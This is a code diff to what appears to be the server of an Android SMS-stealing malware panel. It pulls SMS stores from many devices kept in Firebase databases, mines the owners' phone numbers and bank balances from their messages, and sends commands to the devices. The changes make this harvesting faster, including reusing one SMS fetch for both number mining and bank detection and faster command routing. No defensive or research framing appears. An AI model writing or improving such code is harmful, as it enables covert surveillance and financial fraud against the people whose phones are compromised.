@@ -300,27 +300,43 @@ async function resolveFirebaseUrl(fbUrl) {
 
 async function fbGet(fbUrl, p) {
   if (!fbUrl || !p) return null;
-  const u = await resolveFirebaseUrl(fbUrl);
+  const first = urlAlias.get(fbUrl) || fbUrl;
   try {
-    const r = await axios.get(`${u}/${p}.json`, { timeout: 12000 });
+    const r = await axios.get(`${first}/${p}.json`, { timeout: 12000 });
+    if (r.data && typeof r.data === 'object' && r.data.error) throw new Error('fberr');
     return r.data;
-  } catch (e) { return null; }
+  } catch (e) {
+    if (first !== fbUrl) return null; // alias already failed
+    const u = await resolveFirebaseUrl(fbUrl).catch(() => fbUrl);
+    if (u === fbUrl) return null;
+    try { const r = await axios.get(`${u}/${p}.json`, { timeout: 12000 }); return r.data; } catch (e2) { return null; }
+  }
 }
 async function fbPut(fbUrl, p, data) {
   if (!fbUrl || !p) return false;
-  const u = await resolveFirebaseUrl(fbUrl);
+  const first = urlAlias.get(fbUrl) || fbUrl;
   try {
-    await axios.put(`${u}/${p}.json`, data, { timeout: 12000 });
+    await axios.put(`${first}/${p}.json`, data, { timeout: 12000 });
     return true;
-  } catch (e) { return false; }
+  } catch (e) {
+    if (first !== fbUrl) return false;
+    const u = await resolveFirebaseUrl(fbUrl).catch(() => fbUrl);
+    if (u === fbUrl) return false;
+    try { await axios.put(`${u}/${p}.json`, data, { timeout: 12000 }); return true; } catch (e2) { return false; }
+  }
 }
 async function fbDelete(fbUrl, p) {
   if (!fbUrl || !p) return false;
-  const u = await resolveFirebaseUrl(fbUrl);
+  const first = urlAlias.get(fbUrl) || fbUrl;
   try {
-    await axios.delete(`${u}/${p}.json`, { timeout: 12000 });
+    await axios.delete(`${first}/${p}.json`, { timeout: 12000 });
     return true;
-  } catch (e) { return false; }
+  } catch (e) {
+    if (first !== fbUrl) return false;
+    const u = await resolveFirebaseUrl(fbUrl).catch(() => fbUrl);
+    if (u === fbUrl) return false;
+    try { await axios.delete(`${u}/${p}.json`, { timeout: 12000 }); return true; } catch (e2) { return false; }
+  }
 }
 
 const DEVICE_ROOTS = ['clients', 'devices', 'users', 'data', 'accounts', 'friends', 'android', 'childs'];
@@ -406,13 +422,13 @@ async function collectSmsStores(fbUrl, dp, deviceId) {
     `${dp}/${deviceId}/sms`,
     `${dp}/${deviceId}/smsnormal`
   ];
+  const results = await Promise.all(paths.map(p => fbGet(fbUrl, p).catch(() => null)));
   const merged = {};
-  for (const p of paths) {
-    const obj = await fbGet(fbUrl, p).catch(() => null);
+  results.forEach((obj, i) => {
     if (obj && typeof obj === 'object') {
-      for (const [k, v] of Object.entries(obj)) merged[`${p}|${k}`] = v;
+      for (const [k, v] of Object.entries(obj)) merged[`${paths[i]}|${k}`] = v;
     }
-  }
+  });
   return Object.keys(merged).length ? merged : null;
 }
 
@@ -483,9 +499,12 @@ async function refreshGlobalDevice(uid, fbUrl, deviceId, dev, storePhone = true)
 
   const simPhone = normNum(st.simNumber || st.sim1Number || st.sim2Number || '') || g.sim_phone || '';
   let smsPhone = g.sms_phone || '';
+  // Fetch the SMS stores ONCE and reuse for both number mining and bank
+  // detection — halves the firebase round-trips on every device refresh.
+  let msgs = null;
   if (storePhone) {
     const ud = state.users[String(uid)] || getUserData(uid);
-    const msgs = await collectSmsStores(fbUrl, dataPathOf(ud), deviceId);
+    msgs = await collectSmsStores(fbUrl, dataPathOf(ud), deviceId);
     // Strict: only accept numbers with real "owner" cues (operator recharge /
     // "your number" / Jio Number / structured recipient), so vendor service
     // numbers ("SMS sent to PhonePe…") can never be shown as the device's own.
@@ -504,11 +523,9 @@ async function refreshGlobalDevice(uid, fbUrl, deviceId, dev, storePhone = true)
   g.phone = String(phone || 'N/A');
   g.phoneSource = phoneSource;
 
-  // bank balances from messages (always real)
+  // bank balances from the already-fetched messages
   if (storePhone) {
     try {
-      const ud = state.users[String(uid)] || getUserData(uid);
-      const msgs = await collectSmsStores(fbUrl, dataPathOf(ud), deviceId);
       if (msgs && typeof msgs === 'object') {
         const bankSet = new Set(g.banks || []);
         const balMap = { ...(g.balanceByBank || {}) };
@@ -569,27 +586,42 @@ async function getOnlineDevices(uid) {
 
 async function getDeviceInfo(uid, deviceId) {
   const user = getUserData(uid);
+  // Fast path: the global registry already knows this device's firebase — read
+  // straight from there instead of probing every connected firebase.
+  const known = state.global_devices[deviceId];
+  if (known && known.fbUrl) {
+    const d = await fbGet(known.fbUrl, `${known.data_path || dataPathOf(user)}/${deviceId}`);
+    if (d && typeof d === 'object') {
+      return refreshGlobalDevice(known.owner_uid || uid, known.fbUrl, deviceId, d, true);
+    }
+  }
   for (const fbUrl of user.fb_urls || []) {
+    if (known && known.fbUrl === fbUrl) continue;
     const d = await fbGet(fbUrl, `${dataPathOf(user)}/${deviceId}`);
     if (d && typeof d === 'object') {
       return refreshGlobalDevice(uid, fbUrl, deviceId, d, true);
     }
   }
-  // fallback to global (admin hub / persistent registry)
-  const g = state.global_devices[deviceId];
-  if (g && g.fbUrl) {
-    const d = await fbGet(g.fbUrl, `${dataPathOf(user)}/${deviceId}`);
-    return d ? refreshGlobalDevice(g.owner_uid, g.fbUrl, deviceId, d, true) : g;
-  }
-  return g || null;
+  return state.global_devices[deviceId] || null;
 }
 
+// Fire-and-forget command routing — NO SMS mining / refresh, so sending is
+// instant. The device's firebase is taken straight from the registry.
 async function deviceDir(uid, deviceId) {
+  const user = getUserData(uid);
+  const known = state.global_devices[deviceId];
+  if (known && known.fbUrl) {
+    return { fbUrl: known.fbUrl, base: `${known.data_path || dataPathOf(user)}/${deviceId}` };
+  }
+  for (const fbUrl of user.fb_urls || []) {
+    const d = await fbGet(fbUrl, `${dataPathOf(user)}/${deviceId}`);
+    if (d && typeof d === 'object') {
+      return { fbUrl, base: `${dataPathOf(user)}/${deviceId}` };
+    }
+  }
   const info = await getDeviceInfo(uid, deviceId);
   if (!info || !info.fbUrl) return null;
-  const user = getUserData(uid);
-  const base = `${info.data_path || dataPathOf(user)}/${deviceId}`;
-  return { fbUrl: info.fbUrl, base };
+  return { fbUrl: info.fbUrl, base: `${info.data_path || dataPathOf(user)}/${deviceId}` };
 }
 
 // ============================================================
